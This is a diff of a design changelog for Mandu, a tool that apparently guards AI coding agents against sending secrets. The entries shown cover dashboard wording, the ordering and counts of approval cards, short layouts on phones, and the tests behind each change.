+- **The command names the agent you use** (2026-10-26). Every sentence
+  that tells you how to start protecting an agent said "`mandu claude` (or
+  `mandu codex`)", though Mandu runs five agents: a Goose user who ran
+  `mandu scan` read "Mandu read 40 Goose sessions" and was told to start
+  Claude Code. Now the commands come from one pure helper
+  (`start-commands.ts` `startCommands(scanSessions, recordedKinds)`): the
+  agents of the sessions recorded under Mandu, newest first (`HomeInput.sessions`,
+  agent sessions only, never `agentOf`, which holds drill and test sessions),
+  then the last scan's by its session count, highest first
+  (`LastScanWire.sessions`; its `claude-code` is `mandu claude`); only the
+  agents Mandu runs, so Gemini CLI, Copilot CLI and Cursor are never a
+  command (the Scan page still says Mandu does not run them yet); at most
+  two, "`a`" or "`a` (or `b`)". When Mandu knows none (no scan kept, no
+  session recorded) it is today's `mandu claude` (or `mandu codex`). The
+  server sends the list once, `/api/home`'s `start` (e.g. `["mandu
+  goose"]`); the hero above, Running now's empty row ("Start one with
+  `mandu goose`."), History's empty row (*An empty History has nothing to
+  find*) and Settings › Protection's not-running sentence draw from it,
+  home.js falling back to the two when an older server sends none. Home's
+  scan card names the same list, and so does the Scan page (2026-10-29,
+  §4.25ai *The Scan page names the agent you use*): its page is built once
+  per kept scan file, so its two sentences carry the record's own commands
+  tagged `start`, and home.js draws them from Home's `start`. No new read:
+  the route reads the kept scan once per poll for the card and the list. The first-run card still lists all five.
+  Fixed command words only: no session, file or host enters them.
 - **Protection is off when nothing runs** (2026-10-22). With no arbiter,
   `unknown` said "Not connected. The protection service is not reachable,
   so nothing can be checked." That is right for a fault, and wrong for the
@@ -4974,9 +5396,9 @@ tab only):
   instance alive, no `mandu <agent>` launch alive (its scope run dir
   `<epochSec>-<pid>`). Then the hero is `off`, "Protection is off: no agent
   runs with Mandu." with "Your agents send what they read to the AI as it
-  is, secrets included. To protect one, start it with `mandu claude` (or
-  `mandu codex`).", the commands as code (last-scan.ts `PROTECT_COMMAND`,
-  the scan card's), no count; `protection.notRunning` makes the top bar
+  is, secrets included. To protect one, start it with `mandu goose`.", the
+  commands as code, the agents you use (*The command names the agent you
+  use* below; the scan card's too), no count; `protection.notRunning` makes the top bar
   "Protection off" (amber) and Settings › Protection say "Mandu is not
   running now, so no agent is protected." The setup card shows unless an
   agent session is on record in the event store (`everRan`: Mandu ran here
@@ -4999,6 +5421,117 @@ tab only):
   over an unreadable list), `home-js-top-status.test.ts` (the top bar and
   the hero drawn), and `tests/stack/scan-dashboard-link.test.ts` (the real
   `mandu dashboard` where Mandu never ran: `/api/home` and `/api/scan`).
+
+  **Every other line says so too (2026-10-31).** Until then only the
+  hero, the top bar and Settings › Protection read this state; every line
+  that could not read something read it as a fault, in five wordings:
+  "Could not check for waiting questions. The protection service may be
+  unreachable." (Home's card, Approvals), the same for *Answered earlier*,
+  Your rules and Models, "The protection service is not connected."
+  (Sensitivity labels, Prompt filters), Built-in protections "not
+  connected", History "Could not read the history. The protection service
+  is not running." over its Find box, and Rule changes "The dashboard
+  server answered with an error (404). Refresh in a moment.". Now, while
+  the latest Home poll says `protection.notRunning` (the server's probe,
+  never a guess of the page: home.js `notRunningNow`), a cause that tells
+  only that no service answered (none known, `down`, `not-connected`;
+  `offCause`) is `not-running`, which `cannotCheck` says with no lead, in
+  the words of Settings › Protection, the commands as code
+  (`notRunningWords`): "Mandu is not running now; your rule changes show
+  here once it starts with your first agent: `mandu claude` or `mandu
+  codex`." Each place names itself: *your earlier answers*, *your rule
+  changes*, *your rules* (and "You can still add a rule." after it), *the
+  model list*, *your sensitivity labels*, *your prompt filter settings*
+  (a refused read of those two counts when it says no service answered:
+  `noService`, the route's 404 in either wording, its 503 `unreachable`,
+  the 502 of a failed dial). Find a change says the same with *Clear*,
+  and a link to a rule change says "Mandu is not running now, so this rule
+  change cannot be shown. It is still kept, and shows here once Mandu
+  starts with your first agent: …".
+  - *Waiting for your answer* (Home's card, Approvals) says none waits only
+    where Mandu never ran here (`firstRun`): "No agent runs with Mandu now,
+    so none is waiting for your answer. Mandu starts with your first agent:
+    …". Where it ran before, the questions of that run are kept (the
+    approval queue survives a restart, and a question never expires,
+    *A question from a session that has ended*), so the page cannot say
+    none waits: "Mandu is not running now; questions waiting for your
+    answer show here once it starts with your first agent: …".
+  - Built-in protections, from the server (`builtInProtections` with
+    `notRunning`) and in the page's fallback for an older server: the note
+    "not running" and "Mandu is not running now, so none of these is on.
+    They turn on with your first agent."
+  - History, whose read fails with no service: where Mandu never ran here
+    (`firstRun`), the record is empty, so the list says what an empty
+    record says ("No session has been recorded yet. Start your agent
+    through Mandu, …"), its Find box and switch hidden as §4.25ae hides
+    them; where it ran before, "Mandu is not running now; your sessions show
+    here once it starts with your first agent: …".
+  - Rules › Add a rule and Keys Mandu found (2026-11-03; until then they
+    still said "Labels could not be read: the protection service is not
+    connected." or "… The protection service is not running. Start it under
+    Settings …", and "The protection service is not connected."). The file
+    browser's note over labels the listing could not read
+    (`labelsUnknownNote`) takes the route's `labelError` as a cause: its
+    failed dial `down`, its "the protection service is not connected"
+    `not-connected`, none given unknown; through `offCause` that is
+    "Mandu is not running now; the levels of your files show here once it
+    starts with your first agent: …. You can still choose rules." (the
+    browser lists files without the service), with no link to Settings. Any
+    other `labelError` (an older service, the admin boundary) is a fault
+    and keeps its words. Keys Mandu found, opened with Review, says "Mandu
+    is not running now; the keys it finds show here once it starts with
+    your first agent: …." where its error was (`suggestionsError`) when the
+    suggestions read is one no service answered (`noService`); a sign-in
+    refusal (403/501, `G.denied`) and any other error keep theirs, Scan for
+    keys is drawn as before, and the Approvals card stays hidden while no
+    key waits. The note follows the poll by `followFilesNote` (the `offKey`
+    it was drawn with), the keys' line by `offKey` in the read's signature.
+  - A fault keeps its words: `connected: false` without `notRunning`, no
+    answer of the dashboard (`gone`) and an error of its own.
+  - Once Mandu starts, the first poll that no longer says `notRunning`
+    counts as a return (`loadHome` `back`): `readAgainUnread` reads again
+    what could not be read, and each line's key holds the state
+    (`offKey` in the sameAsDrawn keys of Waiting, Answered earlier, Rule
+    changes and History; `causeKey` for Your rules and Models; the drawn
+    words for Sensitivity labels and Prompt filters, `followCannotCheck`),
+    so a line redraws when the state goes, or when a scan changes the
+    commands it names. Presentation only: the same `/api/home` field, no
+    route, gate or policy change. Tests: `home-js-not-running-lines.test.ts`
+    (jsdom: each place, never ran and ran before, Find a change and the
+    link, a fault's words kept, a poll that turns it off; R9-R10 the file
+    browser's note and Keys Mandu found),
+    `home-view-model.test.ts` (`builtIn`), and
+    `tests/stack/not-running-lines.test.ts` (the real `mandu scan` then
+    `mandu dashboard` with no arbiter: Home, Approvals, Rules (with Add a
+    rule and Keys Mandu found opened), Settings and History served and
+    drawn in jsdom, none of the fault words, no planted
+    value).
+
+  **Said once (2026-11-02).** Until then Settings › Protection said this
+  state twice, in two voices: "Saved as on. Mandu is not running now, so no
+  agent is protected. It starts with your first agent: mandu claude (or
+  mandu codex)." with the commands in plain words, and under it the service
+  line "Stopped. It starts again by itself when you next start an agent
+  with mandu. [Start]". Now, while `protection.notRunning` is set, the
+  Protection sentence draws the commands as code with Copy, as Home does
+  (home.js `startRunCodes`, `runCode` over `startList`): "… It starts with
+  your first agent: `mandu claude` [Copy] or `mandu codex` [Copy]."; and
+  while the service line also reads Stopped (`serviceQuiet`: the summary
+  available and `stopped`), the line is "Stopped." and Start, with no
+  sentence. Start keeps its place and stays the way to run Mandu with no
+  agent. A crashed, starting, running or adopted service, and one stopped
+  while `notRunning` is unset, keep their words; the server's `WORDS` are
+  unchanged. The Home poll redraws the line from the summary it was drawn
+  from when `serviceQuiet` changes (`followServiceQuiet`, held while a
+  request of the line is out or Restart's question is open), and the
+  sentence follows `runningKey` as before. Presentation only: no route,
+  gate or policy change. Tests: `home-js-protection-not-running.test.ts`
+  (jsdom: the code and its Copy, the bare Stopped line, the stopped line
+  with Mandu running, crashed and adopted unchanged, a poll either way),
+  `home-js-empty-states.test.ts` (the commands as code, `a` or `b`), and
+  `tests/stack/settings-not-running.test.ts` (the real `mandu scan` then
+  `mandu dashboard` with no arbiter: the served Settings page, its Copy,
+  no "It starts again by itself", no planted value).
 - **The hero counts the rule changes waiting, as the badge does** (2026-10-18).
   The Approvals badge and Home's *Approvals waiting (N)* count questions plus
   rule changes (the pending policy proposals the page reads from
@@ -5042,15 +5575,203 @@ tab only):
   Secrets the disclosure follows either, as above. A rule change waiting
   does hold the rules as they are, so with one the words are as before. The
   verdict stays `waiting`: the question still needs an answer, and the
-  ladder, the clock, the window's count and the Approvals badge count it.
+  ladder, the clock and the window's count count it. The Approvals badge
+  counts it too, in grey while nothing else waits (2026-10-28, *The top
+  bar's two marks*), and so does the tab icon's dot (2026-10-31, *The tab
+  says the protection state*).
   "Ended" is the card's rule (a recorded exit, or no event in the running
-  window), so a session quiet past that window reads as ended here too.
+  window when no live launch of the session remains, §4.10.4 *A live
+  launch keeps `R`*), so a session quiet past that window whose launch is
+  gone reads as ended here too.
   Tests: `home-view-model.test.ts` (all ended, one and several; mixed; none
   ended byte for byte; with a rule change; a session not on record; the
   vocabulary sweep) and, over a real arbiter and dashboard whose asking
   session's launcher records its real `session_exit`,
   `tests/stack/home-waiting-verdict.test.ts` (the served headline, the
   verdict, the badge, the bound send still going to its host).
+  **The order of the lists** (2026-10-25). The server lists the waiting
+  questions newest first, so a person who quit an agent right after it
+  asked left the newest question on top: it took one of Home's three
+  places (`HOME_ASK_CAP`) above an older question a running agent still
+  waited on, which fell to "1 more question in Approvals". Home and
+  Approvals now draw the questions an agent waits on first and those from
+  sessions that have ended after, each kind newest first (`renderAsks`'s
+  `order`, from `askerEnded` in the page; no server change), so Home's
+  three are the ones holding an agent up when there are three. On
+  Approvals, *Waiting for your answer* puts the ended ones under a small
+  heading, **From sessions that have ended**, with one line, "No agent is
+  waiting on these now. Your answer decides what happens the next time an
+  agent asks the same.", and a card under it leaves out its own "The agent
+  that asked has ended, …" (§4.34), which the heading says once. The
+  heading shows only when some, not all, have ended: a list of one kind
+  needs none, and its ended cards keep their sentence, as on Home, which
+  has no heading. The heading is a sibling of the cards with no `data-id`,
+  so it is no card to the answer line's rank (§4.25 *An answer says what
+  it did*); an answered live card's line goes above the heading, an ended
+  one's under it. The session page's *Needs your OK* (one session's
+  questions) keeps the server's order. No count changes: the nav badge,
+  the headline and *Approvals waiting (N)* count every question. Tests:
+  `home-js-home.test.ts` (four questions, the newest ended: the three live
+  ones drawn), `home-js-approvals.test.ts` (live, heading, ended; of one
+  kind, no heading; a poll with the same questions draws nothing; the
+  session page), `home-js-answer-line.test.ts` L9 (the line in its group),
+  and over a real arbiter, dashboard and the launcher's real
+  `session_exit`, `tests/stack/approvals-ended-last.test.ts`.
+  **Home's link to the rest** (2026-10-28). With the ended questions last,
+  the ones Home does not show are often only questions no agent waits
+  on, and "5 more questions in Approvals" read as five more agents held
+  up. The link now counts the hidden ones from sessions that have ended
+  (`moreAsks`, Home's `live first` order only) in the words of the
+  Approvals heading, so the person finds them under it: none ended, "2
+  more questions in Approvals" as before; all, "5 more questions in
+  Approvals, all from sessions that have ended" ("1 more question in
+  Approvals, from a session that has ended"); some, "5 more questions in
+  Approvals, 3 from sessions that have ended" ("…, 1 from a session that
+  has ended"). Its target stays Approvals; Approvals and the session page
+  show every question, so they never draw it. Tests: `home-js-home.test.ts`
+  (all, some, one of several, the one, none), `css-link-width.test.ts` K2
+  (the longest words still sit at their column's edge at 390 and 320 px)
+  and, served over a real arbiter with two real `session_exit`s,
+  `tests/stack/approvals-ended-last.test.ts` M1.
+  **Waiting for your answer counts its questions** (2026-10-31). Home's
+  heading says "Approvals waiting (5)", draws three and links here, where
+  the heading gave no number: a person answering a backlog counted the
+  cards to know how much was left. The heading now reads "Waiting for your
+  answer (5)", the count muted in `#approvals-waiting-count`, as Rules ›
+  *Your rules* and *Files made from your secrets* count theirs. It counts
+  the questions listed under it, those under *From sessions that have
+  ended* too; Home's heading and the nav badge also count the waiting rule
+  changes, which Approvals lists in their own block above, so with one
+  waiting Home reads one more. With none waiting, or the queue not read
+  (`waitingKnown` false), there is no count: the list's own line says so.
+  `renderApprovals` sets it before its `sameAsDrawn` return, so every
+  poll keeps it current, and writes it only when its text changed; an
+  answer that takes a card off lowers it with the redraw that follows.
+  Tests: `home-js-approvals.test.ts` (five, two ended; a same poll leaves
+  it unwritten; a poll that adds one; a Block; none; unread) and, over a
+  real arbiter's egress gate and the production adapter, served signed
+  in, `tests/stack/approvals-waiting-count.test.ts` ("(2)", a Block,
+  "(1)", no key value nor token in any page).
+  **Rule changes count their cards** (2026-11-04). The block above,
+  *Rule changes your agent asked for*, had no count, and each change is a
+  full card (with a typed ALLOW box on a wide one), so a person arriving
+  from "Approvals waiting (3)" counted cards to know how many of the 3
+  were rule changes. Its heading now reads "Rule changes Claude Code asked
+  for (2)" / "Rule changes waiting for you (3)": the words in
+  `#approvals-proposals-words`, chosen as before, and the count, muted, in
+  `#approvals-proposals-count`, which counts the cards listed under it
+  (`S.proposals`). With none waiting (only an answer's line left, which
+  keeps the block shown) there is no count, and the words alone end the
+  heading: the count's span holds its own leading space. `renderProposals`
+  sets it before its `sameAsDrawn` return and writes it only when its text
+  changed, as the questions' count; an answer that takes a card off lowers
+  it with the redraw that follows, a poll that brings one raises it. The
+  section link ("Rule changes asked for") is unchanged. Tests:
+  `home-js-proposals.test.ts` (three, an Allow, a poll that adds one, a
+  same poll leaves it unwritten, only the line left) and, served over a
+  real arbiter and the production adapter, `tests/stack/agent-page-rule-change.test.ts`
+  R2 ("Rule changes Claude Code asked for (1)", no key value nor token in
+  any page).
+  **An ended question is short on Approvals** (2026-10-26, built
+  2026-10-30). Ended questions never expire (§4.34), so they pile up under
+  the heading, and each was drawn at full height: about 410 px at 1280 px
+  against 176 px for Home's short card of the same question, and about
+  785 px at 390 px, so five questions from quit sessions put some
+  3,900 px of cards on a phone above *Answered earlier* and *Rule
+  changes*. A card under **From sessions that have ended** is now Home's
+  short card (`askCard` with `grouped` and not `expanded`): the sentence;
+  the *why*, the moment and the session that asked; on a send of a
+  secret, the line on which answers last (§4.34 *Home's card says which
+  answers last*), so Always allow and Block still say they are kept
+  before you press one; the same buttons; and, where Home has *Details in
+  Approvals*, which would link to the page you are on, a text button
+  **What each answer does** (`aria-expanded`). Pressed, it opens the full
+  card's three cells, *If you click Send without it*, *If you click Always
+  allow or Block* and *See what the agent was doing* in place under the
+  card's line (`openAskMore`, `askDetail`), and reads **Hide**. The open
+  cards are kept by question id (`S.askOpen`), so a poll that draws the
+  list again keeps them open, and the button carries its question
+  (`data-ask-more`), so the poll's keyed refocus (`placeKey`) puts the
+  focus back on it. Full as before: every live card on a wide screen (a
+  phone draws them short too, *A waiting question is short on a phone*
+  below); every card when all have ended, on a wide screen (no heading;
+  whether that list should go short too is left open); a held message (`family: 'prompt'`) and a program's send of the
+  files it holds (`sources`, with its per-file Always), whose answers need
+  the detail; and the card `/approvals/<id>` names (`askFolds`): a link or
+  notification opens it full, marked. That mark is part of what the list is
+  drawn from (`markedEnded`, a draw key of its own), so following such a
+  link from Approvals draws the card full at once; once the mark goes (a
+  search of *Answered earlier*), the card is drawn short with What each
+  answer does open, never folded under the reader. The answers, routes,
+  counts, the answer line (L9: an answer from a short card leaves its line
+  under the heading) and the session page's *Needs your OK* are unchanged.
+  Tests: `home-js-approvals.test.ts` (short under the heading, live full;
+  the toggle over a poll with the same and with more questions, the focus
+  kept; the marked card; all-ended, a held message and `sources` full),
+  `home-js-answer-line.test.ts` L9, and over a real arbiter, dashboard and
+  `session_exit`, `tests/stack/approvals-ended-last.test.ts` A5.
+  **A waiting question is short on a phone** (#251, 2026-11-02). Measured
+  in headless Chromium over a real arbiter with the key's sends waiting,
+  a live card on Approvals at 375 px was about 1,040 px tall, its first
+  answer button some 930 px below its top (997 px tall at 390 px; 491 px at
+  1280 px), because it stacks *Why it stopped*, *What the AI has now* and
+  the *If you click* notes above its buttons: three questions put over
+  3,000 px of cards on a phone, two screens of scrolling per question. At
+  the page's phone breakpoint (`max-width: 760px`, `matchMedia`, read by
+  `onPhone`) every card of Approvals is now the short card above, live
+  ones too (`renderAsks`: short when grouped or on a phone, through the
+  same `askFolds`; `askCard`'s `approvals` argument draws What each answer
+  does where Home's link would be): the sentence, the why, the moment and
+  the session, the line on which answers last, so Always allow and Block
+  still say they are kept before you press one (the human accepted that
+  line as enough in sight on a phone, 2026-11-02), and the buttons right
+  under it, about 390 px below the card's top at 375 px; What each answer
+  does opens the full cells in place. On a phone an all-ended list goes
+  short as well, every card of the page being short there. Full on every
+  screen, as above: a held message, a program's send of the files it
+  holds, and the card `/approvals/<id>` names (`markedEnded` then names a
+  live card too, so the list is drawn again when its mark goes). A wide
+  screen, or a browser without `matchMedia`, draws as before. The query's
+  `change` (it fires when the width crosses the breakpoint, not on every
+  resize) draws Approvals again in the other form (`phoneFlipped`, the
+  phone state a draw key of its own, `approvals-phone`): opened cards stay
+  open (`S.askOpen`) and the focus stays on its control (`pollPlace`,
+  `pollRefocus`). No answer, route, count or wording changes. Tests:
+  `home-js-approvals.test.ts` (*short on a phone*: a live send short with
+  its answers-last line and four buttons, opened to three cells and both
+  notes; a held message, `sources` and the named card full; wide and no
+  `matchMedia` full; a flip keeps an open card open and the focus on Allow
+  once) and, over a real arbiter, the production adapter and real
+  headless Chromium, `tests/stack/approvals-phone-short.test.ts` (Allow
+  once within 450 px of the card's top at 375 px; full at 1280 px with no
+  reload; short again and opened; no value nor token in any page).
+  *The session page's Needs your OK follows the same rule* (Shoemaker
+  #300, 2026-11-03). It drew the full card at every width, so a phone
+  reader who followed "1 question waiting for you" (`?go=waiting`) or a
+  Running now row's Details still scrolled a screen to answer: measured in
+  the same harness at 375 px, its first card was about 1,060 px tall, Allow
+  once about 950 px below its top. On a phone it is now the short card
+  (about 500 px, Allow once about 390 px below its top): `renderAsks`'
+  session-page mode (`order = 'agent'`, drawn by `drawAgentWaiting`) keeps
+  the page's own order, with no heading of ended sessions, passes
+  `approvals` to `askCard` so the short card opens What each answer does
+  in place rather than linking to Approvals, and never forgets an open
+  card (only Approvals, which lists every question, does). The same cards
+  stay full as on Approvals, except that the one kept full by name is the
+  question a See what the agent was doing link opened the page for
+  (`/agents/<id>?ask=<question id>`, `S.agentAsk`). `phoneFlipped` draws
+  the session page's Needs your OK again too, from the data it last drew
+  (`S.agentWaitingShown`) and only that block, so the story stays as it
+  is; the page's draw key does not need the phone state, since a poll
+  that brings the same page leaves the flipped block as drawn and one
+  that brings a change draws it in the current form. `?go=waiting` still
+  lands on the first card, its Allow once now in sight. Tests:
+  `home-js-agent-phone-short.test.ts` (P1–P5: short sends and a full held
+  message, opened in place and kept over a poll with the focus, full when
+  wide or without `matchMedia`, a flip without a read and a poll after
+  it, `?go=waiting` and `?ask=`) and `approvals-phone-short.test.ts` P5
+  (the session's page at 375 and 1280 px, no reload, and its
+  `/api/home/agent` answer in the oracle).
 - **Asks as sentences.** `describeAsk` (`view-model/ask-words.ts`, shared
   with the inspector's Approvals page, §4.34) renders a queue row by family (send /
   run / read / show) as text parts, plain text plus `code` values: "Claude
@@ -5099,6 +5820,118 @@ tab only):
   `home-js-row-control-names.test.ts`, component `home-earlier.test.ts`,
   `approvals-after-answer.test.ts`, stack `history-says-waiting.test.ts`
   (Home's rows and History's share their first line over the real server).
+  **The folder stays in sight** (2026-10-30, #178): the folder is what
+  tells two sessions of one agent apart, and the line was one ellipsized
+  text, so whenever the prompt alone filled it the "…" ate the folder.
+  Headless Chromium measured it: at 390 px "What is in
+  deploy/staging.tfvars? Show me its lines." (52 characters) ended the
+  line at 349 px with its folder starting at 381, out of sight; a prompt
+  of about 40 characters already hid it on a phone, about 70 at 1280 px.
+  Now a row with a `cwd` draws `div.sub.prompt-line`: the prompt in
+  `span.prompt-text`, " in " in `span.prompt-in`, the folder in
+  `code.prompt-folder` around a `<bdi dir="ltr">`. app.css makes the line a
+  one-line flex: **a long prompt is cut before the folder** (the prompt
+  shrinks and is ellipsized), and the folder does not shrink while it fits
+  **half the line** (`max-width: 50%`); **a longer folder is cut at its
+  start**, "…al-backend/services", keeping the last names, the ones that
+  name the project (`direction: rtl`; the left-to-right `bdi` keeps "~"
+  and "/" where they are). The cut is the stylesheet's alone: the page's
+  text, the row's `title`, its name (`lineWords`, so Details, the "last
+  step" and the waiting link) and History's Find a session read the whole
+  prompt and folder as before. Cutting the folder by its parts in
+  home.js was weighed and left: it would change the row's words and so
+  its name. A short line reads as before; a row without a folder is the
+  old one-text `div.sub.ellipsis`. Print shows the rows as on screen.
+  Tests: jsdom `home-js-row-folder.test.ts` F1-F3, stack
+  `long-name-breaks.test.ts` B13-B15 (real Chromium at 390 and 1280 px,
+  Home and History: the folder's box inside its line, a long prompt cut,
+  a long folder at half the line cut at its start, nothing past the
+  window).
+  **The count is a link to the question** (2026-10-27):
+  in Running now, Earlier and History, "1 question waiting for you" /
+  "N questions waiting for you" is an `a.agent-waiting-link` to
+  `/agents/<id>?go=waiting` (home.js `waitingLink`, `data-land`
+  `waiting`; *A link that goes where a tile goes*), which opens the
+  session at *Needs your OK*, its first card focused. It was the one count
+  on a row that asks you to act, and it was plain text: the row and its
+  Details open the page at its top, *Needs your OK* below every tile (a
+  scroll past all four on a phone). The rest of the counts line stays
+  text (`countsLine` takes the link as a node among its words). Its name
+  is its words, then its row, as Details is named (`rowControlName`): "1
+  question waiting for you: Claude Code, Fix the test in ~/ws". A click on
+  it is not a row click (`rowClick` skips links); a modified click is the
+  browser's, a new tab at the same address. The row key does not change:
+  the link is drawn from `id` and `waiting`, which the key already holds.
+  The row's count and the page's list count a question on the session
+  that raised it last (`askedBy`; `home-routes.ts` filters the page's
+  `waiting` the same way), so the link lands on a card it counts. Tests:
+  jsdom `home-js-row-waiting-link.test.ts` Q1-Q3, stack
+  `agent-tiles-go.test.ts` A3 (the served History page over a real
+  arbiter, the link followed to the first card).
+  **A session that ran with protection off says so** (2026-10-26, nightly
+  #125). In Off nothing is checked, so `holds` stayed true: a running Off
+  session had the green dot of a protected one, an ended one the grey dot,
+  and its counts line was empty, which reads as "nothing happened", not
+  "nothing was guarded". Once protection was back on, nothing on Home or
+  History marked the sessions that ran without it. Now the facts carry
+  `off` (`HomeSessionFacts.off`, `vm.paired.mode === "off"` in
+  `home-routes.ts`: the mode the arbiter reported at the session's start
+  and the launcher recorded, `recordedProtection`, never today's setting)
+  and the row `protectionOff` (`homeAgentRow`, shared by Running now,
+  Earlier and History, so the three change together). Such a row has the
+  amber dot (`.dot.warn`) and "protection was off" first in its counts
+  line (home.js `rowMarks`), after "protection failed" when that holds: a
+  failed session keeps its red dot. The third mark, "less protection than
+  usual" (`lessProtection`, 2026-10-27, nightly #199), comes after both
+  for a session where a protection that is on by default did not start
+  (§4.21 *A protection that did not start*) and gives the same amber dot
+  (home.js `rowWarn`); *Find a session* does not match it either. Unit
+  `home-view-model.test.ts`, jsdom `home-js-off-session.test.ts` (O6),
+  stack `product-session-notice.test.ts` (N5: `/api/home`'s and
+  `/api/home/history`'s rows). A session that recorded no mode (an
+  older launcher, one whose arbiter did not report its axes, a facts read
+  that failed) is drawn as before: Off is never guessed. History's *Find a
+  session* does not match the words: it matches before any session's
+  facts are read (`historyMatches`), and matching them would read every
+  session's events. History's *Only sessions where Mandu stepped in*
+  keeps such a row (`historyFlagged`, §4.25ae, 2026-10-30, nightly #183),
+  in its place among the others. The session's page says it at its top (§4.25b, *The
+  page says protection was off*). Tests: unit `home-view-model.test.ts`
+  (the facts of a recorded Off, Secrets, unrecorded and launch-side-only
+  session; a failed Off one keeps `holds: false`), jsdom
+  `home-js-off-session.test.ts`, stack `off-session-marked.test.ts` (an
+  arbiter at the `off` axes, then the same store at `secrets`).
+  **Home's hero counts them** (2026-10-27, nightly #192). An Off session
+  adds to none of the window's counts (Mandu masked and blocked nothing in
+  it), so once protection was back on, a 24 hours in which an agent ran
+  unguarded read "Nothing to count in the last 24 hours." and then "Mandu
+  last stepped in …": the calmest line Home has, drawn exactly when
+  nothing guarded the session. The hero's own Off sentence covers only
+  protection being off now. Now the window counts them too:
+  `window.off`, the counted sessions in it whose facts say `off: true`,
+  with its owner in `window.only.off` like the other counts (the one
+  session that holds it, else null; null when the window was only partly
+  counted). `renderHero` draws it first among the window's counts (after a
+  waiting fact, so the lead "In the last 24 hours:" goes on it), amber
+  (`strong.warn`): "**1** session ran with protection off" / "**2**
+  sessions ran with protection off", titled "Mandu only watched in it
+  (them): nothing was masked or blocked." One session links its page
+  (`countLink({ session })`); several, or a partly counted window, link
+  History plain, whose rows mark each one (not its *Only where Mandu
+  stepped in* switch: whether Off sessions belong there is a separate
+  question, still open). `windowCountedNothing` is false while
+  `off > 0`, so neither the empty line nor `lastSteppedIn` is drawn under
+  it. Under the `off` verdict (protection off now) the facts line is not
+  drawn at all: the headline already says so. An older server that sends
+  no `off`: nothing new. Tests: unit `home-view-model.test.ts` (one, two,
+  partly counted, none, outside the window), `home-last-stepped-in.test.ts`
+  (a window whose only session ran Off gets no `lastSteppedIn`), jsdom
+  `home-js-off-session.test.ts` O5 (the words for 1 and 2, amber, the
+  links, its place after a waiting fact, no empty line beside it, none
+  under the `off` verdict or from an older server) and stack
+  `off-session-marked.test.ts` M2b (protection back on, OFF the window's
+  only session: `/api/home` counts it and names no `lastSteppedIn`, the
+  served Home links OFF's page and never says "Nothing to count").
   **A live row names its last step as well as its start** (2026-10-22):
   a Running now or waiting row reads "started 6 hours ago · last step 2
   minutes ago" (home.js `liveWhen`), the second moment `HomeAgent.lastAt`
@@ -5115,10 +5948,44 @@ tab only):
   still*), with only whether the row names a last step (`liveDrawnFrom`):
   each poll `moveLastSteps` writes the moment into the kept row's
   `time.agent-last` in place, so a working agent's next step neither draws
-  its row again nor takes the focus from its Details. Earlier and History
-  keep their one moment. Tests: jsdom `home-js-home.test.ts`, stack
+  its row again nor takes the focus from its Details. Earlier keeps its one
+  moment, the end. **History's running rows name it too** (2026-10-27):
+  "running now, started 6 hours ago · last step 2 minutes ago" (`liveWhen`
+  takes its verb, so both lists draw it with one function; History's row
+  key is `liveDrawnFrom` while the row runs, and `renderHistory` calls
+  `moveLastSteps` over every row loaded, the pages Show more brought
+  included). Until then History kept the one moment, a choice made with
+  the first version of this paragraph, but History is the one list of
+  every running session: Running now lists only sessions whose last event
+  is inside Home's window (`windowHours`), so an agent idle in a forgotten
+  terminal since yesterday leaves Running now and still read "running now,
+  started …" on History, the row that most needs to say how long ago it
+  last did something. Its ended rows keep "ended …". Tests: jsdom
+  `home-js-home.test.ts`, `home-js-history-poll.test.ts` P8-P9, stack
   `product-rows-stay.test.ts` K5 (a launch recorded 10 minutes ago, then
-  two model calls through the real proxy).
+  model calls through the real proxy, read on Home and on History).
+  **The last step is a link to it** (2026-10-25): the second phrase is an
+  `a.when-phrase.agent-last-link` to `/agents/<id>?go=latest` (`data-land`
+  `latest`, *A link that goes where a tile goes*), which opens the session
+  at its newest turn, focused, as *Latest turn* does. Seeing what the agent
+  just did is the main reason to look at Running now, and the row and its
+  Details open the page at its top, many screens above that turn in a long
+  session. The link is the phrase's own box, so the narrow-column break
+  stays between the two phrases; it takes the page's link colour. Its name
+  is its words first, then where it goes and its row, as the session
+  header's button is named (`lastStepName`): "Last step 2 minutes ago: go
+  to the latest turn of Claude Code, Fix the test in ~/ws" (agentRow's
+  `data-about`, the words Details is named by), kept in step with the words
+  by `moveLastSteps` and `refreshWhen`; the clock time stays on the `time`'s
+  title. A plain or modified click on the row's blank space still follows
+  Details (`rowClick` picks `a.right`, not the row's first agent link), so
+  it opens the page at its top. A live row thus has two tab stops; Details
+  stays the row's name. A running row of History has the same link, named
+  the same way (since 2026-10-27, above). Tests: jsdom
+  `home-js-last-step-link.test.ts` K1-K4, `home-js-history-poll.test.ts`
+  P8, stack
+  `agent-latest-turn.test.ts` T5 (a real mouse press at 1280 and 390 px,
+  then Back).
   The window's `blocked`
   and `sent` add up the sessions' counts (below, *Home counts what the
   session page shows*). **A recorded exit ends "running"**: `HomeFacts`
@@ -5158,7 +6025,7 @@ tab only):
 **Past the newest 20 (2026-10-18).** Approvals keeps two lists of past
 decisions, *Answered earlier* and *Rule changes*, and until 2026-10-18 each
 stopped at 20 rows with nothing after the last: no count, no *Show more*.
-Each row carries the only one-click reversal of its answer (*Allow
+Each row carries the only one-click reversal of its answer (*Always allow
 instead*, *Block instead*, *Send masked instead*) or its *Undo*, and an
 *Allowed once* answer is listed nowhere else, so the 21st answer of a busy
 afternoon was gone from the page, a reader took the 20 rows for everything,
@@ -5191,6 +6058,16 @@ waiting for you." as if Mandu had lost it. Both now page as History does
   marks it in place: "That question was already answered. Its answer is
   marked below, under Answered earlier." It says "no longer waiting" only
   when the answer is nowhere.
+- `/approvals/<pc-…|pp-…>` for a rule change past the rows *Rule changes*
+  draws (2026-10-23: a rule's origin line links its newest change, which
+  can be older than 20, §4.25i) does the same: one read of
+  `policy/changes?limit=500` (`seekChanges`), then *Rule changes* draws down
+  to the page that holds it (`S.changes.want`, so the poll keeps those rows)
+  and marks it in place. The read counts as one out (`S.changes.out`), so
+  the poll does not read meanwhile and draw the newest 20 over it. The note
+  says the change is not listed only when that read did not find it either.
+  When the changes could not be read at all, the note says so instead
+  (*Rule changes says when it could not be read*, under *Empty states*).
 - A link to Approvals starts both lists over at 20, as a link to History
   does; Back keeps the rows brought. The three *Show more* lines share
   `moreLine` (home.js).
@@ -5199,12 +6076,116 @@ Tests: `home-view-model.test.ts` (`answeredPage`: order, the `after`
 boundary, ties, `total`; Home's list is its first page),
 `home-js-answered-more.test.ts` (jsdom: the count line, Show more, a failed
 read, the poll keeping 40, `/approvals/<id>` for the 30th, *Rule changes*
